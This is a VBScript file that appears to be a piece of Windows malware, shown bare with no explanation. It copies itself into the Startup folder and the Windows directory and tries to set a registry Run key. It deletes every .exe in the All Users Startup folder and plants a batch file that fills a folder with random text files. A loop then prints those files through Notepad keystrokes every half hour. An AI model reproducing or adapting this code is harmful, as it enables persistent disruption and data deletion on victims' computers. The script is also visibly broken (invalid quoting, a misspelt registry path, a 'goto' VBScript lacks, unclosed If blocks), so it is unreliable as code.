set root = CreateObject("Scripting.FileSystemObject")
set open = WScript.CreateObject("Wscript.Shell")
if not root.FileExists("C:\WINNT\rg57.vbs") Then
set registry = root.CreateTextFile("C:\WINNT\rg57.vbs")
registry.writeline "set fso = CreateObject("Scripting.FileSystemObject")"
registry.writeline "fso.regwrite = "[HKLM]\SOFTWARE\Miscrosoft\Windows\CurrentVersion\Run\bbc", "C:\WINNT\bbc.vbs""
registry.close
Open.Run "C:\WINNT\rg57.vbs"
else
if root.FileExists("C:\Docume~1\alluse~1\startm~1\programs\startup\*.exe") Then
root.DeleteFile "C:\Docume~1\alluse~1\startm~1\programs\startup\*.exe", True
else
if not root.FileExists("C:\Docume~1\alluse~1\startm~1\programs\startup\bbc.vbs") Then
root.CopyFile wscript.ScriptFullName ,"C:\Docume~1\alluse~1\startm~1\programs\startup\bbc.vbs", True
else
if not root.FileExists("C:\WINNT\bbc.vbs") Then
root.CopyFile wscript.ScriptFullName ,"C:\WINNT\bbc.vbs", True
else
if root.FileExists("C:\Docume~1\alluse~1\startm~1\programs\startup\AuToexec.bat") Then goto doned
else
if not root.FileExists("C:\Docume~1\alluse~1\startm~1\programs\startup\AuToexec.bat") Then
set write = root.CreateTextFile("C:\Docume~1\alluse~1\startm~1\programs\startup\AuToexec.bat")
write.writeline "@echo off"
write.writeline "cd %windir%"
write.writeline "if exist bbc goto view"
write.writeline "if not exist bbc goto mk"
write.writeline ":mk"
write.writeline "md bbc"
write.writeline ":view"
write.writeline "set name=%random%.txt"
write.writeline "set place=%windir%\bbc\%name%"
write.writeline "set text=%random%%random%%random%%random%%random%%random%%random%"
write.writeline "echo %text% >> %place%"
write.writeline "exit"
write.close
doned:
do
open.Run "C:\Docume~1\alluse~1\startm~1\programs\startup\AuToexec.bat"
Open.Run "C:\WINNT\bbc\*.txt"
Open.AppActivate "NotePad"
Open.SendKeys "^P"
Open.SendKeys "{ENTER}"
Open.SendKeys "%{f4}"
wscript.sleep 1800000
root.DeleteFile "C:\WINNT\bbc\*.*", True
Loop